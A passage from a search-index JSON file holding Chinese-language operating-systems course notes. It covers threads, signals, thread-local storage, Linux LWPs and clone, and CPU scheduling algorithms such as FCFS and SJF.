fork \u90fd\u662f\u4ece\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u5355\u4e2a\u7ebf\u7a0b\u8c03\u7528\u7684<ul> <li>\u5b58\u5728\u4e24\u79cd\u5b9e\u73b0\u65b9\u5f0f\uff1a<ul> <li>duplicate \u5f53\u524d\u7ebf\u7a0b\u4f5c\u4e3a\u4e00\u4e2a\u8fdb\u7a0b</li> <li>duplicate \u5f53\u524d\u8fdb\u7a0b\u7684\u6240\u6709\u7ebf\u7a0b\u4f5c\u4e3a\u4e00\u4e2a\u8fdb\u7a0b</li> </ul> </li> <li>\u5177\u4f53\u5982\u4f55\u5b9e\u73b0\u770b\u7cfb\u7edf<ul> <li>\u6709\u4e9b UNIX \u7cfb\u7edf\u4fdd\u7559\u4e86\u4e24\u79cd fork \u7684\u5b9e\u73b0\u65b9\u5f0f</li> <li>Linux \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a duplicate \u6240\u6709\u7ebf\u7a0b</li> </ul> </li> </ul> </li> <li>exec \u662f\u7528\u65b0\u7684\u7a0b\u5e8f\u6765\u66ff\u4ee3\u539f\u6765\u7684\u7a0b\u5e8f\uff0c\u4f1a\u66ff\u4ee3\u6240\u6709\u7ebf\u7a0b</li> <li>fork \u548c exec \u7ecf\u5e38\u4e00\u8d77\u4f7f\u7528\uff08\u5148 fork\uff0c\u7136\u540e exec\uff09<ul> <li>\u5982\u679c\u7cfb\u7edf\u4e2d\u5b9e\u73b0\u4e86\u591a\u79cd fork \u7684\u8bed\u4e49\uff1a<ul> <li>\u5982\u679c fork \u540e\u7acb\u5373 exec\uff0c\u5219\u4f1a\u53ea duplicate \u5f53\u524d\u7ebf\u7a0b\uff08\u5426\u5219\u6d6a\u8d39\u4e86\uff09</li> <li>\u5426\u5219\u4f1a duplicate \u6240\u6709\u7ebf\u7a0b</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_18","title":"\u4fe1\u53f7\u5904\u7406","text":"<ul> <li>\u4fe1\u53f7\uff08Signals\uff09\u662f UNIX \u7cfb\u7edf\u4e2d\u5728\u51fa\u73b0\u4e00\u4e9b\u7279\u5b9a\u4e8b\u4ef6\u7684\u65f6\u5019\uff0c\u5411\u8fdb\u7a0b\u53d1\u9001\u7684\u901a\u77e5</li> <li>\u53ef\u4ee5\u5728\u7528\u6237\u7a0b\u5e8f\u4e2d\u6ce8\u518c\u4fe1\u53f7\u5904\u7406\u51fd\u6570 callback<ul> <li>\u4f8b\u5982\uff0c\u7a0b\u5e8f\u4e2d\u51fa\u73b0\u4e86\u975e\u6cd5\u5730\u5740\u8bbf\u95ee\uff0c\u7cfb\u7edf\u4f1a\u53d1\u9001\u4e00\u4e2a SIGSEGV \u4fe1\u53f7\uff08Segmentation Violation\uff09<ul> <li>\u5982\u679c\u7a0b\u5e8f\u4e2d\u6ce8\u518c\u4e86\u9488\u5bf9 SIGSEGV \u7684\u5904\u7406\u51fd\u6570\uff0c\u5219\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570</li> <li>\u5426\u5219\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c\u9ed8\u8ba4\u7684\u4fe1\u53f7\u5904\u7406\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u6bb5\u9519\u8bef\u800c\u88ab\u7ec8\u6b62</li> </ul> </li> </ul> </li> <li>\u4fe1\u53f7\u53ef\u80fd\u662f\u540c\u6b65\u7684\u6216\u5f02\u6b65\u7684<ul> <li>\u540c\u6b65\u4fe1\u53f7\uff0c\u4f8b\u5982\u5f02\u5e38\uff0c\u4f1a\u5728\u5f53\u524d\u7ebf\u7a0b\u4e2d\u88ab\u5904\u7406</li> <li>\u5f02\u6b65\u4fe1\u53f7\uff0c\u4f8b\u5982 I/O\uff0c\u5219\u5728\u591a\u7ebf\u7a0b\u60c5\u51b5\u4e0b\u6709\u6b67\u4e49</li> </ul> </li> <li>\u591a\u7ebf\u7a0b\u5f02\u6b65\u4fe1\u53f7\u53d1\u9001\u7684\u51e0\u79cd\u9009\u62e9\uff1a<ul> <li>\u53d1\u9001\u5230\u4fe1\u53f7\u4ea7\u751f\u7684\u7ebf\u7a0b</li> <li>\u53d1\u9001\u5230\u5f53\u524d\u8fdb\u7a0b\u4e2d\u7684\u6240\u6709\u7ebf\u7a0b</li> <li>\u53d1\u9001\u5230\u5f53\u524d\u8fdb\u7a0b\u4e2d\u7684\u67d0\u4e00\u4e2a\u6216\u67d0\u51e0\u4e2a\u7279\u5b9a\u7684\u7ebf\u7a0b</li> <li>\u53d1\u9001\u5230\u8fdb\u7a0b\u4e2d\u6307\u5b9a\u63a5\u6536\u6240\u6709\u4fe1\u53f7\u7684\u4e00\u4e2a\u7279\u5b9a\u7ebf\u7a0b</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#_19","title":"\u7ec8\u6b62\u7ebf\u7a0b\u7684\u5904\u7406\u65b9\u5f0f","text":"<ul> <li>Thread Cancellation \u5373\u5728\u4e00\u4e2a\u7ebf\u7a0b\u7ed3\u675f\u4e4b\u524d\u5f3a\u5236\u7ec8\u6b62</li> <li>\u7ebf\u7a0b\u53ef\u80fd\u4f1a\u88ab\u7acb\u5373\u7ec8\u6b62\uff0c\u4e5f\u53ef\u80fd\u5ef6\u8fdf\u7ec8\u6b62</li> <li>\u7acb\u5373\u7ec8\u6b62\uff08asynchronous cancellation\uff09<ul> <li>\u7ebf\u7a0b\u4f1a\u88ab\u7acb\u5373\u7ec8\u6b62</li> <li>\u4f46\u5982\u679c\u76ee\u6807\u7ebf\u7a0b\u6267\u884c\u5230\u4e86\u5173\u952e\u90e8\u5206\uff08critical section\uff09\u65f6\u53ef\u80fd\u4f1a\u9020\u6210\u8bbf\u95ee\u8d44\u6e90\u7684\u7d0a\u4e71<ul> <li>\u4f8b\u5982\u7ebf\u7a0b A\u3001B \u6267\u884c\u540c\u4e00\u6bb5\u4ee3\u7801\uff0c\u4ee3\u7801\u4e2d\u6709\u4e00\u90e8\u5206\u8981\u8bbf\u95ee\u67d0\u4e00\u5904\u8d44\u6e90\uff0c\u8fd9\u91cc\u5c31\u79f0\u4e3a critical section</li> <li>\u5728\u540c\u4e00\u65f6\u523b\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c critical section\uff0c\u8bbf\u95ee\u8d44\u6e90</li> <li>\u5982\u679c\u7ebf\u7a0b A \u6b63\u5728\u8bbf\u95ee\u8d44\u6e90\uff0c\u90a3\u4e48 B \u6b64\u65f6\u4f1a\u88ab block \u4f4f</li> <li>\u5982\u679c\u6b64\u65f6\u7ec8\u6b62\u7ebf\u7a0b A\uff0c\u5219\u6709\u53ef\u80fd\u4f1a\u9020\u6210\u8d44\u6e90\u8bbf\u95ee\u7d0a\u4e71</li> </ul> </li> </ul> </li> <li>\u5ef6\u8fdf\u7ec8\u6b62\uff08deferred cancellation\uff09<ul> <li>\u5141\u8bb8\u7ebf\u7a0b\u5468\u671f\u6027\u68c0\u67e5\u81ea\u5df1\u662f\u5426\u53ef\u4ee5\u7ed3\u675f</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#thread-specific-data","title":"thread-specific data","text":"<ul> <li>Thread-Local Storage\uff08TLS\uff09\u5141\u8bb8\u6bcf\u4e2a\u7ebf\u7a0b\u62e5\u6709\u81ea\u5df1\u7684\u6570\u636e\u62f7\u8d1d</li> <li>\u4e0e\u5c40\u90e8\u53d8\u91cf\u7684\u533a\u522b<ul> <li>\u5c40\u90e8\u53d8\u91cf\u53ea\u5728\u5f53\u524d\u7684\u4f5c\u7528\u57df\u4e2d\u53ef\u89c1</li> <li>TLS \u5728\u6574\u4e2a\u7ebf\u7a0b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6240\u6709\u51fd\u6570\u8c03\u7528\u4e2d\u90fd\u53ef\u89c1</li> </ul> </li> <li>\u7c7b\u4f3c\u4e8e static data\uff0c\u4e0d\u8fc7\u6bcf\u4e2a\u7ebf\u7a0b\u62e5\u6709\u7684\u90fd\u662f\u72ec\u7acb\u7684\u6570\u636e</li> <li>\u4f7f\u7528 TLS<ul> <li>\u901a\u8fc7 pthread\uff1a<ul> <li>\u5728\u6bcf\u4e2a\u7ebf\u7a0b\u6267\u884c\u7684\u51fd\u6570\u4e2d\u53ef\u4ee5\u8c03\u7528 pthread_setspecific() \u6765\u8bbe\u7f6e TLS\uff0cpthread_getspecific() \u6765\u83b7\u53d6 TLS <pre><code>pthread_key_t key;\n\nvoid *exec_in_thread(void *args_in) {\n    int *tl = malloc(sizeof(int));\n    *tl = 1;\n    pthread_setspecific(key, tl);\n}\n</code></pre></li> </ul> </li> <li>\u901a\u8fc7 __thread \u5173\u952e\u5b57<ul> <li>\u5c06\u53d8\u91cf\u58f0\u660e\u4e3a __thread\uff0c\u5219\u8fd9\u4e2a\u53d8\u91cf\u5c31\u662f TLS <pre><code>__thread int x = 3;\n\nvoid *exec_in_thread(void *args_in) {\n    x += 1;\n    printf(\"%d\\n\", x);\n}\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#lwp","title":"LWP","text":"<ul> <li>\u6b64\u5904\u7684 LWP \u6307\u7684\u662f\u4e00\u4e2a\u6982\u5ff5\uff0c\u548c\u540e\u9762\u63d0\u5230\u7684 LWP \u4e0d\u662f\u540c\u4e00\u4e2a\u4e1c\u897f</li> <li>Lightweight process\uff08LWP\uff09\u662f\u5728 many-to-many \u548c two level \u4e24\u79cd\u6a21\u578b\u4e2d\u7528\u6237\u6001\u7ebf\u7a0b\u548c\u5185\u6838\u6001\u7ebf\u7a0b\u7684\u4e2d\u95f4\u5c42</li> <li>\u5bf9\u4e8e\u7528\u6237\u6001\u7ebf\u7a0b\u5e93\uff0cLWP \u5145\u5f53\u865a\u62df\u5904\u7406\u5668\uff08virtual processors\uff09\u7684\u89d2\u8272\uff0c\u6765\u8c03\u5ea6\u7528\u6237\u6001\u7ebf\u7a0b</li> <li>\u4e00\u4e2a LWP \u4f1a\u88ab\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5185\u6838\u6001\u7ebf\u7a0b\u4e0a</li> <li>upcalls\uff1a\u5f53\u5185\u6838\u8981\u8c03\u5ea6\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u4f1a\u901a\u8fc7 upcall \u6765\u901a\u77e5\u7ebf\u7a0b\u5e93\uff08\u7c7b\u4f3c signal\uff09</li> </ul>"},{"location":"cs/system/cs2/topic4/#linux-task","title":"Linux task","text":"<ul> <li>Linux \u4e2d\u9664\u4e86 fork \u4ee5\u5916\u8fd8\u6709\u4e00\u4e2a clone \u7cfb\u7edf\u8c03\u7528</li> <li>clone \u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u4f53\uff0c\u63a5\u6536\u4e00\u4e9b flag \u6765\u6307\u5b9a\u8d44\u6e90\u5171\u4eab\u60c5\u51b5<ul> <li>CLONE_FS\u3001CLONE_VM\u3001CLONE_FILES\u3001CLONE_SIGHAND \u5206\u522b\u8868\u793a\u662f\u5426\u5171\u4eab\u6587\u4ef6\u7cfb\u7edf\u3001\u865a\u62df\u5185\u5b58\u3001\u6587\u4ef6\u63cf\u8ff0\u7b26\u3001\u4fe1\u53f7\u5904\u7406</li> <li>\u5982\u679c\u56db\u4e2a flag \u90fd\u8bbe\u7f6e\u4e86\uff08\u5b8c\u5168\u5171\u4eab\uff09\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u521b\u5efa\u4e86\u4e00\u4e2a\u7ebf\u7a0b</li> <li>\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u4efb\u4f55 flag\uff08\u5b8c\u5168\u4e0d\u5171\u4eab\uff09\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u521b\u5efa\u4e86\u4e00\u4e2a\u8fdb\u7a0b\uff08fork\uff09</li> <li>\u90e8\u5206\u8bbe\u7f6e\uff0c\u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684 task</li> </ul> </li> <li>Linux \u5185\u6838\u5e76\u4e0d\u533a\u5206\u7ebf\u7a0b\u548c\u8fdb\u7a0b\uff0c\u90fd\u5c06\u5176\u770b\u4f5c task</li> <li>Linux \u573a\u666f\u4e0b\uff0c\u5185\u6838\u7ebf\u7a0b\u88ab\u79f0\u4e3a LWP\uff08\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff09\uff0c\u4e5f\u79f0\u4e3a kernel scheduling entity\uff08\u5185\u6838\u8c03\u5ea6\u5b9e\u4f53\uff09</li> </ul>"},{"location":"cs/system/cs2/topic4/#pthread","title":"Pthread \u7ebf\u7a0b\u5e93","text":"<ul> <li>\u4e00\u5957 POSIX\uff08Portable Operating System Interface for uniX\uff09\u6807\u51c6\u7684 API \u7528\u4e8e\u7ebf\u7a0b\u7684\u521b\u5efa\u3001\u7ba1\u7406\u3001\u540c\u6b65\u7b49</li> <li>\u5728 UNIX / \u7c7b UNIX \u7cfb\u7edf\u4e2d\u5e38\u7528</li> <li>Pthread \u662f\u4e00\u5957\u7ebf\u7a0b\u884c\u4e3a\u7684\u6807\u51c6\uff0c\u5177\u4f53\u5b9e\u73b0\u7531\u5e93\u5f00\u53d1\u8005\u51b3\u5b9a</li> </ul>"},{"location":"cs/system/cs2/topic4/#linux","title":"Linux \u5bf9\u4e8e\u7ebf\u7a0b\u7684\u5b9e\u73b0","text":"<ul> <li>Linux \u4e2d\u7528\u6237\u7ebf\u7a0b\u662f\u670d\u4ece POSIX \u6807\u51c6\u7684</li> <li>Linux \u4e2d\u6709\u4e24\u4e2a\u5355\u72ec\u7684\u6267\u884c space<ul> <li>user space\uff1a\u7528\u6237\u6001\u7ebf\u7a0b\u662f\u901a\u8fc7 pthread \u5e93\u6765\u521b\u5efa\u7684</li> <li>kernel space<ul> <li>\u5185\u6838\u7ebf\u7a0b\u90fd\u662f lightweight process\uff08LWP\uff09</li> <li>\u4e00\u4e2a LWP \u662f\u4e00\u4e2a\u5355\u72ec\u88ab\u8c03\u5ea6\u7684\u5355\u5143</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/#linux-lwp","title":"Linux LWP","text":"<ul> <li>\u901a\u8fc7 gettid() API \u53ef\u4ee5\u83b7\u53d6\u5f53\u524d LWP \u7684 ID<ul> <li>\u4e0e pthread_self() \u4e0d\u540c</li> </ul> </li> <li>\u901a\u8fc7 ps -efL \u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u4e2d\u7684\u6240\u6709 LWP \u53ca\u7f16\u53f7</li> <li>\u6bcf\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b\u90fd\u4f1a 1:1 \u6620\u5c04\u5230\u4e00\u4e2a LWP \u4e0a</li> <li>\u4e00\u4e2a\u7528\u6237\u6001\u7684\u8fdb\u7a0b\u662f\u4e00\u7cfb\u5217\u6709\u5171\u540c group ID \u7684 LWP \u7684\u96c6\u5408<ul> <li>\u5206\u7ec4\u53ef\u4ee5\u8ba9\u5185\u6838\u8fdb\u884c\u8d44\u6e90\u7684\u5171\u4eab\u7b49</li> </ul> </li> <li>Linux \u901a\u8fc7 clone \u7cfb\u7edf\u8c03\u7528\u6765\u521b\u5efa LWP     <pre><code>int clone(int (*fn)(void *), void *child_stack, int flags, void *arg);\n</code></pre><ul> <li>clone \u6bd4 fork \u66f4\u901a\u7528\uff0cfork \u53ef\u4ee5\u901a\u8fc7 clone \u6765\u5b9e\u73b0</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic5/","title":"CPU \u8c03\u5ea6","text":"<p> \u7ea6 2433 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 13 \u81f3 14 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/system/cs2/topic5/#_1","title":"\u57fa\u7840\u6982\u5ff5","text":"<ul> <li>\u6b64\u5904\u4e0d\u533a\u5206\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b\u7684\u6982\u5ff5<ul> <li>\u5185\u6838\u7ebf\u7a0b\u624d\u662f\u4e00\u4e2a\u88ab\u8c03\u5ea6\u7684\u5b9e\u4f53\uff0c\u6700\u5c0f\u5355\u4f4d</li> </ul> </li> <li>\u8fdb\u7a0b\u7684\u6267\u884c\u4f1a\u5206\u4e3a\u4e24\u4e2a\u7c7b\u578b<ul> <li>CPU burst\uff1a\u5927\u90e8\u5206\u65f6\u95f4\u5728\u505a CPU \u8fd0\u7b97<ul> <li>\u4e0d\u540c\u8fdb\u7a0b\u3001\u4e0d\u540c\u8ba1\u7b97\u673a\u7684 CPU burst \u957f\u5ea6\u5dee\u522b\u5f88\u5927</li> </ul> </li> <li>I/O burst\uff1a\u5927\u90e8\u5206\u65f6\u95f4\u5728\u505a I/O<ul> <li>\u8fdb\u7a0b\u5927\u90e8\u5206\u90fd\u662f I/O burst</li> </ul> </li> </ul> </li> <li>\u5f53\u524d\u8fdb\u7a0b\u5728 I/O burst \u65f6\u4f1a\u8c03\u5ea6\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u8fdb\u884c\u6267\u884c</li> </ul>"},{"location":"cs/system/cs2/topic5/#cpu_1","title":"CPU \u8c03\u5ea6\u5668","text":"<ul> <li>CPU Scheduler \u662f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4e2d\u8d1f\u8d23\u8c03\u5ea6\u7684\u90e8\u4ef6</li> <li>\u5de5\u4f5c\u65b9\u5f0f\u662f\u4ece ready queue \u4e2d\u9009\u62e9\u4e00\u4e2a\u8fdb\u7a0b\u6765\u5c06 CPU \u8d44\u6e90\u5206\u914d\u7ed9\u5b83</li> <li>CPU \u8c03\u5ea6\u53d1\u751f\u7684\u65f6\u673a\uff08\u5c06 CPU \u8d44\u6e90\u5206\u914d\u7ed9\u5176\u5b83\u4efb\u52a1\uff09<ul> <li>\u5f53\u524d\u8fdb\u7a0b\u4ece running \u72b6\u6001\u8f6c\u6362\u5230 waiting \u72b6\u6001\uff0c\u4f8b\u5982\u8fdb\u884c I/O \u7b49\u5f85</li> <li>\u5f53\u524d\u8fdb\u7a0b\u4ece running \u72b6\u6001\u8f6c\u6362\u5230 ready \u72b6\u6001\uff0c\u4f8b\u5982\u4e2d\u65ad\u4ea7\u751f</li> <li>\u5f53\u524d\u8fdb\u7a0b\u4ece waiting \u72b6\u6001\u8f6c\u6362\u5230 ready \u72b6\u6001\uff0c\u4f8b\u5982 I/O \u5b8c\u6210</li> <li>\u5f53\u524d\u8fdb\u7a0b\u4ece running \u72b6\u6001\u8f6c\u6362\u5230 terminated \u72b6\u6001\uff0c\u5373\u8fdb\u7a0b\u7ed3\u675f</li> </ul> </li> <li>\u4e0a\u9762\u7b2c\u4e00\u4e2a\u548c\u7b2c\u56db\u4e2a\u662f\u975e\u62a2\u5360\u5f0f\u7684\uff08nonpreemptive\uff09<ul> <li>\u5f53\u524d\u8fdb\u7a0b\u4e3b\u52a8\u653e\u5f03 CPU \u8d44\u6e90</li> <li>\u4e5f\u79f0\u4e3a\u534f\u4f5c\u5f0f\u8c03\u5ea6\uff08cooperative scheduling\uff09</li> <li>\u4f7f\u7528\u975e\u62a2\u5360\u5f0f\u8c03\u5ea6\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u65e6\u4e00\u4e2a\u7a0b\u5e8f\u88ab\u5206\u914d\u4e86 CPU \u8d44\u6e90\uff0c\u5219\u4f1a\u4e00\u76f4\u6267\u884c\uff0c\u76f4\u5230\u7ed3\u675f\u6216\u8005\u7b49\u5f85 I/O</li> </ul> </li> <li>\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u662f\u62a2\u5360\u5f0f\u7684\uff08preemptive\uff09<ul> <li>\u62a2\u5360\u5f0f\u8c03\u5ea6\u9700\u8981\u786c\u4ef6\u652f\u6301\uff0c\u4f8b\u5982\u8ba1\u65f6\u5668</li> <li>\u9700\u8981\u4e00\u4e9b\u540c\u6b65\u7684\u5143\u8bed\uff08synchronization primitives\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic5/#_2","title":"\u62a2\u5360","text":"<ul> <li>\u62a2\u5360\uff08preemption\uff09\u662f\u6307\u8fdb\u7a0b\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u975e\u81ea\u613f\u5730\u88ab\u4e2d\u65ad</li> <li>cooperative multitasking os\uff1a\u8fdb\u7a0b\u4e00\u76f4\u8fd0\u884c\u5230\u4e3b\u52a8\u653e\u5f03 CPU \u8d44\u6e90\u6216\u7b49\u5f85 I/O</li> <li>preemptive multitasking os\uff1a\u8c03\u5ea6\u5668\u4f1a\u5f3a\u5236\u5207\u6362\u8fdb\u7a0b</li> </ul>"},{"location":"cs/system/cs2/topic5/#_3","title":"\u7528\u6237\u6001\u62a2\u5360","text":"<p>\u7528\u6237\u6001\u62a2\u5360\u6709\u4e24\u79cd\u53d1\u751f\u7684\u65f6\u673a\uff1a</p> <ul> <li>\u7cfb\u7edf\u8c03\u7528\u5b8c\u6210\u540e\u4ece\u5185\u6838\u6001\u8fd4\u56de\u7528\u6237\u6001\u65f6</li> <li>\u8fdb\u884c\u5b8c\u4e2d\u65ad\u5904\u7406\u540e\u4ece\u5185\u6838\u6001\u8fd4\u56de\u7528\u6237\u6001\u65f6</li> </ul>"},{"location":"cs/system/cs2/topic5/#_4","title":"\u5185\u6838\u6001\u62a2\u5360","text":"<p>\u800c\u5982\u679c\u7528\u6237\u6001\u5728\u6267\u884c\u65f6\u8fdb\u884c\u4e86\u7cfb\u7edf\u8c03\u7528\uff0c\u6b64\u65f6\u5728\u5185\u6838\u6001\u6267\u884c\u4ee3\u7801\uff0c\u5982\u679c\u6b64\u65f6\u53d1\u751f\u4e86\u4e2d\u65ad\uff0c\u4e5f\u6709\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u5904\u7406\u7ed3\u675f\u540e\u4ecd\u7136\u8fd4\u56de\u5230\u88ab\u6253\u65ad\u524d\u7684\u7a0b\u5e8f\uff0c\u7ee7\u7eed\u5b8c\u6210\u7cfb\u7edf\u8c03\u7528<ul> <li>\u6b64\u65f6\u5c31\u79f0\u4e3a\u5185\u6838\u975e\u62a2\u5360\uff08kernel nonpreemption\uff09</li> <li>\u4f46\u662f\u4ecd\u7136\u4f1a\u53d1\u751f\u7528\u6237\u6001\u62a2\u5360<ul> <li>\u53ef\u80fd\u5728\u8fd4\u56de\u7528\u6237\u6001\u65f6\u53d1\u751f\u62a2\u5360\uff0c\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b</li> </ul> </li> </ul> </li> <li>\u5904\u7406\u7ed3\u675f\u540e\u8fd4\u56de\u5230\u8c03\u5ea6\u5668\uff0c\u9009\u62e9\u4e86\u4e00\u4e2a\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u8fdb\u884c\u6267\u884c<ul> <li>\u6b64\u65f6\u5c31\u79f0\u4e3a\u5185\u6838\u62a2\u5360\uff08kernel preemption\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic5/#dispatcher","title":"Dispatcher","text":"<ul> <li>Dispatcher \u662f\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4e2d\u8d1f\u8d23\u8fdb\u7a0b\u5207\u6362\u7684\u90e8\u4ef6\uff1a<ul> <li>\u5207\u6362\u4e0a\u4e0b\u6587</li> <li>\u5207\u6362\u5230\u7528\u6237\u6001</li> <li>\u8df3\u8f6c\u5230\u6b63\u786e\u7684\u4f4d\u7f6e\u6062\u590d\u6267\u884c</li> </ul> </li> <li>Dispatch latency\uff1adispatcher \u8fdb\u884c\u5207\u6362\u65f6\u7684\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u4ece\u6682\u505c\u4e00\u4e2a\u8fdb\u7a0b\u5230\u6062\u590d\u53e6\u4e00\u4e2a\u8fdb\u7a0b\uff09</li> </ul>"},{"location":"cs/system/cs2/topic5/#_5","title":"\u8c03\u5ea6\u51c6\u5219","text":"<p>\u5728\u8c03\u5ea6\u7684\u65f6\u5019\u8fdb\u884c\u9009\u62e9\u65f6\u9700\u8981\u8003\u8651\u7684\u56e0\u7d20</p> <ul> <li>CPU \u5229\u7528\u7387\uff08utilization\uff09\uff1aCPU \u8d44\u6e90\u7684\u5229\u7528\u7387\uff0c\u8d8a\u5927\u8d8a\u597d</li> <li>\u541e\u5410\u91cf\uff08throughput\uff09\uff1a\u5355\u4f4d\u65f6\u95f4\u5185\u5b8c\u6210\u7684\u5de5\u4f5c\u91cf\uff0c\u8d8a\u591a\u8d8a\u597d</li> <li>\u5468\u8f6c\u65f6\u95f4\uff08turnaround time\uff09\uff1a\u4ece\u63d0\u4ea4\u4e00\u4e2a\u4f5c\u4e1a\u5230\u5b8c\u6210\u8be5\u4f5c\u4e1a\u6240\u9700\u8981\u7684\u65f6\u95f4</li> <li>\u7b49\u5f85\u65f6\u95f4\uff08waiting time\uff09\uff1a\u5728 ready queue \u4e2d\u7b49\u5f85\u7684\u603b\u65f6\u95f4</li> <li>\u54cd\u5e94\u65f6\u95f4\uff08response time\uff09\uff1a\u4ece\u7528\u6237\u63d0\u4ea4\u8bf7\u6c42\u5230\u5f97\u5230\u7b2c\u4e00\u6b21\u54cd\u5e94\u6240\u9700\u8981\u7684\u65f6\u95f4</li> </ul> <p>\u8c03\u5ea6\u7b97\u6cd5\u4f18\u5316\u65f6\u5e0c\u671b\u66f4\u9ad8\u7684 CPU \u5229\u7528\u7387\u3001\u541e\u5410\u91cf\uff0c\u66f4\u77ed\u7684\u5468\u8f6c\u65f6\u95f4\u3001\u7b49\u5f85\u65f6\u95f4\u3001\u54cd\u5e94\u65f6\u95f4\u3002</p> <ul> <li>\u5927\u90e8\u5206\u60c5\u51b5\u662f\u4f18\u5316\u5e73\u5747\u503c</li> <li>\u4e00\u4e9b\u60c5\u51b5\u4e0b\u60f3\u8981\u4f18\u5316\u6700\u5c0f/\u6700\u5927\u503c<ul> <li>\u4f8b\u5982\u5b9e\u65f6\u7cfb\u7edf\uff0c\u5fc5\u987b\u8981\u4fdd\u8bc1\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u5b8c\u6210</li> </ul> </li> <li>\u5bf9\u4e8e\u4ea4\u4e92\u7cfb\u7edf\uff0c\u5e0c\u671b\u54cd\u5e94\u65f6\u95f4\u7684\u53d8\u5316\u5c3d\u53ef\u80fd\u5c0f</li> </ul>"},{"location":"cs/system/cs2/topic5/#_6","title":"\u8c03\u5ea6\u7b97\u6cd5","text":""},{"location":"cs/system/cs2/topic5/#fcfs","title":"FCFS \u8c03\u5ea6\u7b97\u6cd5","text":"<p>FCFS\uff08First Come First Served\uff09\uff1a\u5148\u6765\u5148\u670d\u52a1</p> <ul> <li>\u662f\u4e00\u79cd\u975e\u62a2\u5360\u5f0f\u8c03\u5ea6</li> <li>waiting time \u5373\u5c06\u6240\u6709\u7b49\u5f85\u65f6\u95f4\u52a0\u8d77\u6765\u9664\u4ee5\u603b\u4efb\u52a1\u6570</li> </ul>"},{"location":"cs/system/cs2/topic5/#sjf","title":"SJF \u8c03\u5ea6\u7b97\u6cd5","text":"<p>SJF\uff08Shortest Job First\uff09\uff1a\u6700\u77ed\u4f5c\u4e1a\u4f18\u5148</p> <ul> <li>\u4e0b\u4e00\u4e2a CPU burst \u6700\u77ed\u7684\u8fdb\u7a0b\u4f18\u5148\u6267\u884c</li> <li>\u662f\u53ef\u8bc1\u660e\u7684\u6700\u4f18\uff08\u5e73\u5747\u7b49\u5f85\u65f6\u95f4\u6700\u77ed\u7684\uff09\u8c03\u5ea6\u7b97\u6cd5</li> <li>SJF \u53ef\u4ee5\u662f\u62a2\u5360\u5f0f\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u975e\u62a2\u5360\u5f0f\u7684<ul> <li>\u62a2\u5360\u5f0f\u7684 SJF \u53c8\u79f0\u4e3a shortest-remaining-time-first \u8c03\u5ea6\u7b97\u6cd5</li> </ul> </li> <li>\u96be\u70b9\u662f\u5982\u679c\u9884\u6d4b CPU burst \u7684\u957f\u5ea6<ul> <li>\u5047\u8bbe\u548c\u5386\u53f2 CPU burst \u76f8\u5173</li> <li>\u901a\u8fc7 exponential averaging \u6765\u9884\u6d4b<ul> <li>\\(\\tau_{n+1}=\\alpha t_n+(1-\\alpha )\\tau_n\\) \uff0c\u5176\u4e2d\uff1a<ul> <li>\\(\\tau_{n+1}\\)\uff1a\u9884\u6d4b\u7684\u4e0b\u4e00\u4e2a CPU burst \u957f\u5ea6</li> <li>\\(\\tau_n\\)\uff1a\u7b2c n \u6b21\u9884\u6d4b\u7684 CPU burst</li> <li>\\(t_n\\)\uff1a\u7b2c n \u6b21\u5b9e\u9645\u7684 CPU burst</li> <li>\\(\\alpha\\)\uff1a\u5e73\u6ed1\u56e0\u5b50\uff0c\u8868\u793a\u5386\u53f2\u9884\u6d4b\u7684\u6743\u91cd</li> </ul> </li> <li>\u8d8a\u8001\u7684\u5386\u53f2\u5360\u7684\u6743\u91cd\u8d8a\u5c0f\uff0c\u65b0\u7684\u9884\u6d4b\u5360\u7684\u6743\u91cd\u8d8a\u5927</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic5/#_7","title":"\u4f18\u5148\u7ea7\u8c03\u5ea6\u7b97\u6cd5","text":"<p>\u4f18\u5148\u7ea7\u8c03\u5ea6\u7b97\u6cd5\uff08priority 